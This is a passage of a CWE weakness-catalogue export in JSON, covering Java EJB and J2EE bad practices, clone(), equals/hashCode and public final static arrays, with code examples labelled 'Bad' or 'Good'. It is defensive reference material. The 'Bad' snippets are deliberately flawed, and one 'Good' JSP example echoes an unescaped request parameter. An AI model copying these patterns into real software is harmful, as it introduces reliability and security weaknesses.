              "ExampleCode": "```\n\t@Entity\n\tpublic class Customer implements Serializable {\n\t\t\tprivate String id;\n\t\t\tprivate String firstName;\n\t\t\tprivate String lastName;\n\t\t\tprivate Address address;\n\t\t\tpublic Customer() {...}\n\t\t\tpublic Customer(String id, String firstName, String lastName) {...}\n\t\t\t@Id\n\t\t\tpublic String getCustomerId() {...}\n\t\t\tpublic synchronized void setCustomerId(String id) {...}\n\t\t\tpublic String getFirstName() {...}\n\t\t\tpublic synchronized void setFirstName(String firstName) {...}\n\t\t\tpublic String getLastName() {...}\n\t\t\tpublic synchronized void setLastName(String lastName) {...}\n\t\t\t@OneToOne()\n\t\t\tpublic Address getAddress() {...}\n\t\t\tpublic synchronized void setAddress(Address address) {...}\n\t}\n```"
            },
            {
              "BodyText": "However, the customer entity EJB uses the synchronized keyword for the set methods to attempt to provide thread safe synchronization for the member variables. The use of synchronized methods violate the restriction of the EJB specification against the use synchronization primitives within EJBs. Using synchronization primitives may cause inconsistent behavior of the EJB when used within different EJB containers."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP3",
          "EntryName": "Use of an improper API"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "575",
      "Name": "EJB Bad Practices: Use of AWT Swing",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product violates the Enterprise JavaBeans (EJB) specification by using AWT/Swing.",
      "ExtendedDescription": "The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the product violates the following EJB guideline: \"An enterprise bean must not use the AWT functionality to attempt to output information to a display, or to input information from a keyboard.\" The specification justifies this requirement in the following way: \"Most servers do not allow direct interaction between an application program and a keyboard/display attached to the server system.\"",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "695",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Do not use AWT/Swing when writing EJBs."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following Java example is a simple converter class for converting US dollars to Yen. This converter class demonstrates the improper practice of using a stateless session Enterprise JavaBean that implements an AWT Component and AWT keyboard event listener to retrieve keyboard input from the user for the amount of the US dollars to convert to Yen."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\t@Stateless\n\tpublic class ConverterSessionBean extends Component implements KeyListener, ConverterSessionRemote {\n```\n/* member variables for receiving keyboard input using AWT API */* \n\t\t\t\n\t\t\t...\n\t\t\tprivate StringBuffer enteredText = new StringBuffer();\n\t\t\t\n\t\t\t\n\t\t\t */* conversion rate on US dollars to Yen */* \n\t\t\t\n\t\t\tprivate BigDecimal yenRate = new BigDecimal(\"115.3100\");\n\t\t\t\n\t\t\tpublic ConverterSessionBean() {\n\t\t\t```\n\t\t\t\t\tsuper();\n```\n/* method calls for setting up AWT Component for receiving keyboard input */* \n\t\t\t\t\t\n\t\t\t\t\t...\n\t\t\t\t\taddKeyListener(this);}\n\t\t\t\n\t\t\tpublic BigDecimal dollarToYen(BigDecimal dollars) {\n\t\t\t```\n\t\t\t\tBigDecimal result = dollars.multiply(yenRate);\n\t\t\t\treturn result.setScale(2, BigDecimal.ROUND_DOWN);\n\t\t\t}\n```\n/* member functions for implementing AWT KeyListener interface */* \n\t\t\t\n\t\t\tpublic void keyTyped(KeyEvent event) {\n\t\t\t```\n\t\t\t\t...\n\t\t\t}\n\t\t\tpublic void keyPressed(KeyEvent e) {\n\t\t\t}\n\t\t\tpublic void keyReleased(KeyEvent e) {\n\t\t\t}\n```\n/* member functions for receiving keyboard input and displaying output */* \n\t\t\t\n\t\t\tpublic void paint(Graphics g) {...}\n\t\t\t\n\t\t\t...}"
            },
            {
              "BodyText": "This use of the AWT and Swing APIs within any kind of Enterprise JavaBean not only violates the restriction of the EJB specification against using AWT or Swing within an EJB but also violates the intended use of Enterprise JavaBeans to separate business logic from presentation logic."
            },
            {
              "BodyText": "The Stateless Session Enterprise JavaBean should contain only business logic. Presentation logic should be provided by some other mechanism such as Servlets or Java Server Pages (JSP) as in the following Java/JSP example."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\t@Stateless\n\tpublic class ConverterSessionBean implements ConverterSessionRemoteInterface {\n```\n/* conversion rate on US dollars to Yen */* \n\t\t\tprivate BigDecimal yenRate = new BigDecimal(\"115.3100\");\n\t\t\t\n\t\t\tpublic ConverterSessionBean() {\n\t\t\t}\n\t\t\t\n\t\t\t\n\t\t\t */* remote method to convert US dollars to Yen */* \n\t\t\t\n\t\t\tpublic BigDecimal dollarToYen(BigDecimal dollars) {\n\t\t\t```\n\t\t\t\tBigDecimal result = dollars.multiply(yenRate);\n\t\t\t\treturn result.setScale(2, BigDecimal.ROUND_DOWN);\n\t\t\t}\n\t}\n```"
            },
            {
              "Nature": "Good",
              "Language": "JSP",
              "ExampleCode": "```\n\t<%@ page import=\"converter.ejb.Converter, java.math.*, javax.naming.*\"%>\n\t<%!\n\t\t\tprivate Converter converter = null;\n\t\t\tpublic void jspInit() {\n\t\t\t\ttry {\n\t\t\t\t\tInitialContext ic = new InitialContext();\n\t\t\t\t\tconverter = (Converter) ic.lookup(Converter.class.getName());\n\t\t\t\t} catch (Exception ex) {\n\t\t\t\t\tSystem.out.println(\"Couldn't create converter bean.\"+ ex.getMessage());\n\t\t\t\t}\n\t\t\t}\n\t\t\tpublic void jspDestroy() {\n\t\t\t\tconverter = null;\n\t\t\t}\n\t%>\n\t<html>\n\t\t\t<head><title>Converter</title></head>\n\t\t\t<body bgcolor=\"white\">\n\t\t\t\t\t<h1>Converter</h1>\n\t\t\t\t\t<hr>\n\t\t\t\t\t<p>Enter an amount to convert:</p>\n\t\t\t\t\t<form method=\"get\">\n\t\t\t\t\t\t<input type=\"text\" name=\"amount\" size=\"25\"><br>\n\t\t\t\t\t\t<p>\n\t\t\t\t\t\t<input type=\"submit\" value=\"Submit\">\n\t\t\t\t\t\t<input type=\"reset\" value=\"Reset\">\n\t\t\t\t\t</form>\n\t\t\t\t\t<%\n\t\t\t\t\t\tString amount = request.getParameter(\"amount\");\n\t\t\t\t\t\tif ( amount != null && amount.length() > 0 ) {\n\t\t\t\t\t\t\tBigDecimal d = new BigDecimal(amount);\n\t\t\t\t\t\t\tBigDecimal yenAmount = converter.dollarToYen(d);\n\t\t\t\t\t%>\n\t\t\t\t\t<p>\n\t\t\t\t\t<%= amount %> dollars are <%= yenAmount %> Yen.\n\t\t\t\t\t<p>\n\t\t\t\t\t<%\n\t\t\t\t\t\t}\n\t\t\t\t\t%>\n\t\t\t</body>\n\t</html>\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP3",
          "EntryName": "Use of an improper API"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "576",
      "Name": "EJB Bad Practices: Use of Java I/O",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product violates the Enterprise JavaBeans (EJB) specification by using the java.io package.",
      "ExtendedDescription": "The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the product violates the following EJB guideline: \"An enterprise bean must not use the java.io package to attempt to access files and directories in the file system.\" The specification justifies this requirement in the following way: \"The file system APIs are not well-suited for business components to access data. Business components should use a resource manager API, such as JDBC, to store data.\"",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "695",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Do not use Java I/O when writing EJBs."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following Java example is a simple stateless Enterprise JavaBean that retrieves the interest rate for the number of points for a mortgage. In this example, the interest rates for various points are retrieved from an XML document on the local file system, and the EJB uses the Java I/O API to retrieve the XML document from the local file system."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\t@Stateless\n\tpublic class InterestRateBean implements InterestRateRemote {\n\t\t\tprivate Document interestRateXMLDocument = null;\n\t\t\tprivate File interestRateFile = null;\n\t\t\tpublic InterestRateBean() {\n\t\t\t\t\ttry {\n```\n/* get XML document from the local filesystem */* \n\t\t\t\t\t\t\tinterestRateFile = new File(Constants.INTEREST_RATE_FILE);\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tif (interestRateFile.exists())\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t```\n\t\t\t\t\t\t\t\tDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n\t\t\t\t\t\t\t\tDocumentBuilder db = dbf.newDocumentBuilder();\n\t\t\t\t\t\t\t\tinterestRateXMLDocument = db.parse(interestRateFile);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t} catch (IOException ex) {...}\n\t\t\t}\n\t\t\tpublic BigDecimal getInterestRate(Integer points) {\n\t\t\t\treturn getInterestRateFromXML(points);\n\t\t\t}\n```\n/* member function to retrieve interest rate from XML document on the local file system */* \n\t\t\t\n\t\t\tprivate BigDecimal getInterestRateFromXML(Integer points) {...}}"
            },
            {
              "BodyText": "This use of the Java I/O API within any kind of Enterprise JavaBean violates the EJB specification by using the java.io package for accessing files within the local filesystem."
            },
            {
              "BodyText": "An Enterprise JavaBean should use a resource manager API for storing and accessing data. In the following example, the private member function getInterestRateFromXMLParser uses an XML parser API to retrieve the interest rates."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\t@Stateless\n\tpublic class InterestRateBean implements InterestRateRemote {\n\t\t\tpublic InterestRateBean() {\n\t\t\t}\n\t\t\tpublic BigDecimal getInterestRate(Integer points) {\n\t\t\t\treturn getInterestRateFromXMLParser(points);\n\t\t\t}\n```\n/* member function to retrieve interest rate from XML document using an XML parser API */* \n\t\t\t\n\t\t\tprivate BigDecimal getInterestRateFromXMLParser(Integer points) {...}}"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP3",
          "EntryName": "Use of an improper API"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "577",
      "Name": "EJB Bad Practices: Use of Sockets",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product violates the Enterprise JavaBeans (EJB) specification by using sockets.",
      "ExtendedDescription": "The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the product violates the following EJB guideline: \"An enterprise bean must not attempt to listen on a socket, accept connections on a socket, or use a socket for multicast.\" The specification justifies this requirement in the following way: \"The EJB architecture allows an enterprise bean instance to be a network socket client, but it does not allow it to be a network server. Allowing the instance to become a network server would conflict with the basic function of the enterprise bean-- to serve the EJB clients.\"",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "573",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Description": "Do not use Sockets when writing EJBs."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following Java example is a simple stateless Enterprise JavaBean that retrieves stock symbols and stock values. The Enterprise JavaBean creates a socket and listens for and accepts connections from clients on the socket."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\t@Stateless\n\tpublic class StockSymbolBean implements StockSymbolRemote {\n\t\t\tServerSocket serverSocket = null;\n\t\t\tSocket clientSocket = null;\n\t\t\tpublic StockSymbolBean() {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tserverSocket = new ServerSocket(Constants.SOCKET_PORT);\n\t\t\t\t\t} catch (IOException ex) {...}\n\t\t\t\t\ttry {\n\t\t\t\t\t\tclientSocket = serverSocket.accept();\n\t\t\t\t\t} catch (IOException e) {...}\n\t\t\t}\n\t\t\tpublic String getStockSymbol(String name) {...}\n\t\t\tpublic BigDecimal getStockValue(String symbol) {...}\n\t\t\tprivate void processClientInputFromSocket() {...}\n\t}\n```"
            },
            {
              "BodyText": "And the following Java example is similar to the previous example but demonstrates the use of multicast socket connections within an Enterprise JavaBean."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\t@Stateless\n\tpublic class StockSymbolBean extends Thread implements StockSymbolRemote {\n\t\t\tServerSocket serverSocket = null;\n\t\t\tSocket clientSocket = null;\n\t\t\tboolean listening = false;\n\t\t\tpublic StockSymbolBean() {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tserverSocket = new ServerSocket(Constants.SOCKET_PORT);\n\t\t\t\t\t} catch (IOException ex) {...}\n\t\t\t\t\tlistening = true;\n\t\t\t\t\twhile(listening) {\n\t\t\t\t\t\tstart();\n\t\t\t\t\t}\n\t\t\t}\n\t\t\tpublic String getStockSymbol(String name) {...}\n\t\t\tpublic BigDecimal getStockValue(String symbol) {...}\n\t\t\tpublic void run() {\n\t\t\t\ttry {\n\t\t\t\t\tclientSocket = serverSocket.accept();\n\t\t\t\t} catch (IOException e) {...}\n\t\t\t\t...\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "The previous two examples within any type of Enterprise JavaBean violate the EJB specification by attempting to listen on a socket, accepting connections on a socket, or using a socket for multicast."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP3",
          "EntryName": "Use of an improper API"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "578",
      "Name": "EJB Bad Practices: Use of Class Loader",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product violates the Enterprise JavaBeans (EJB) specification by using the class loader.",
      "ExtendedDescription": "The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the product violates the following EJB guideline: \"The enterprise bean must not attempt to create a class loader; obtain the current class loader; set the context class loader; set security manager; create a new security manager; stop the JVM; or change the input, output, and error streams.\" The specification justifies this requirement in the following way: \"These functions are reserved for the EJB container. Allowing the enterprise bean to use these functions could compromise security and decrease the container's ability to properly manage the runtime environment.\"",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "573",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability",
            "Other"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands",
            "Varies by Context"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Description": "Do not use the Class Loader when writing EJBs."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following Java example is a simple stateless Enterprise JavaBean that retrieves the interest rate for the number of points for a mortgage. The interest rates for various points are retrieved from an XML document on the local file system, and the EJB uses the Class Loader for the EJB class to obtain the XML document from the local file system as an input stream."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\t@Stateless\n\tpublic class InterestRateBean implements InterestRateRemote {\n\t\t\tprivate Document interestRateXMLDocument = null;\n\t\t\tpublic InterestRateBean() {\n\t\t\t\t\ttry {\n```\n// get XML document from the local filesystem as an input stream* \n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t *// using the ClassLoader for this class* \n\t\t\t\t\t\t\tClassLoader loader = this.getClass().getClassLoader();\n\t\t\t\t\t\t\tInputStream in = loader.getResourceAsStream(Constants.INTEREST_RATE_FILE);\n\t\t\t\n\t\t\tDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n\t\t\t```\n\t\t\t\tDocumentBuilder db = dbf.newDocumentBuilder();\n\t\t\t\tinterestRateXMLDocument = db.parse(interestRateFile);\n\t\t\t} catch (IOException ex) {...}\n\t}\n\t\t\tpublic BigDecimal getInterestRate(Integer points) {\n\t\t\t\treturn getInterestRateFromXML(points);\n\t\t\t}\n```\n/* member function to retrieve interest rate from XML document on the local file system */* \n\t\t\t\n\t\t\tprivate BigDecimal getInterestRateFromXML(Integer points) {...}}"
            },
            {
              "BodyText": "This use of the Java Class Loader class within any kind of Enterprise JavaBean violates the restriction of the EJB specification against obtaining the current class loader as this could compromise the security of the application using the EJB."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "An EJB is also restricted from creating a custom class loader and creating a class and instance of a class from the class loader, as shown in the following example."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\t@Stateless\n\tpublic class LoaderSessionBean implements LoaderSessionRemote {\n\t\t\tpublic LoaderSessionBean() {\n\t\t\t\ttry {\n\t\t\t\t\tClassLoader loader = new CustomClassLoader();\n\t\t\t\t\tClass c = loader.loadClass(\"someClass\");\n\t\t\t\t\tObject obj = c.newInstance();\n\t\t\t\t\t/* perform some task that uses the new class instance member variables or functions */\n\t\t\t\t\t...\n\t\t\t\t} catch (Exception ex) {...}\n\t\t\t}\n\t\t\tpublic class CustomClassLoader extends ClassLoader {\n\t\t\t}\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP3",
          "EntryName": "Use of an improper API"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "579",
      "Name": "J2EE Bad Practices: Non-serializable Object Stored in Session",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product stores a non-serializable object as an HttpSession attribute, which can hurt reliability.",
      "ExtendedDescription": "A J2EE application can make use of multiple JVMs in order to improve application reliability and performance. In order to make the multiple JVMs appear as a single application to the end user, the J2EE container can replicate an HttpSession object across multiple JVMs so that if one JVM becomes unavailable another can step in and take its place without disrupting the flow of the application. This is only possible if all session data is serializable, allowing the session to be duplicated between the JVMs.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "573",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "In order for session replication to work, the values the product stores as attributes in the session must implement the Serializable interface."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following class adds itself to the session, but because it is not serializable, the session can no longer be replicated."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class DataGlob {\n\t\t\tString globName;\n\t\t\tString globValue;\n\t\t\tpublic void addToSession(HttpSession session) {\n\t\t\t\tsession.setAttribute(\"glob\", this);\n\t\t\t}\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "580",
      "Name": "clone() Method Without super.clone()",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product contains a clone() method that does not call super.clone() to obtain the new object.",
      "ExtendedDescription": "All implementations of clone() should obtain the new object by calling super.clone(). If a class does not follow this convention, a subclass's clone() method will return an object of the wrong type.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "664",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "573",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Other"
          ],
          "Impact": [
            "Unexpected State",
            "Quality Degradation"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Call super.clone() within your clone() method, when obtaining a new object."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "In some cases, you can eliminate the clone method altogether and use copy constructors."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following two classes demonstrate a bug introduced by not calling super.clone(). Because of the way Kibitzer implements clone(), FancyKibitzer's clone method will return an object of type Kibitzer instead of FancyKibitzer."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class Kibitzer {\n\t\t\tpublic Object clone() throws CloneNotSupportedException {\n\t\t\t\t\tObject returnMe = new Kibitzer();\n\t\t\t\t\t...\n\t\t\t}\n\t}\n\tpublic class FancyKibitzer extends Kibitzer{\n\t\t\tpublic Object clone() throws CloneNotSupportedException {\n\t\t\t\t\tObject returnMe = super.clone();\n\t\t\t\t\t...\n\t\t\t}\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP28",
          "EntryName": "Unexpected access points"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "581",
      "Name": "Object Model Violation: Just One of Equals and Hashcode Defined",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not maintain equal hashcodes for equal objects.",
      "ExtendedDescription": "Java objects are expected to obey a number of invariants related to equality. One of these invariants is that equal objects must have equal hashcodes. In other words, if a.equals(b) == true then a.hashCode() == b.hashCode().",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "573",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "697",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Other"
          ],
          "Impact": [
            "Other"
          ],
          "Note": "If this invariant is not upheld, it is likely to cause trouble if objects of this class are stored in a collection. If the objects of the class in question are used as a key in a Hashtable or if they are inserted into a Map or Set, it is critical that equal objects have equal hashcodes."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Both Equals() and Hashcode() should be defined."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "MET09-J",
          "EntryName": "Classes that define an equals() method must also define a hashCode() method"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "582",
      "Name": "Array Declared Public, Final, and Static",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product declares an array public, final, and static, which is not sufficient to prevent the array's contents from being modified.",
      "ExtendedDescription": "Because arrays are mutable objects, the final constraint requires that the array object itself be assigned only once, but makes no guarantees about the values of the array elements. Since the array is public, a malicious program can change the values stored in the array. As such, in most cases an array declared public, final and static is a bug.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "668",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "BackgroundDetails": [
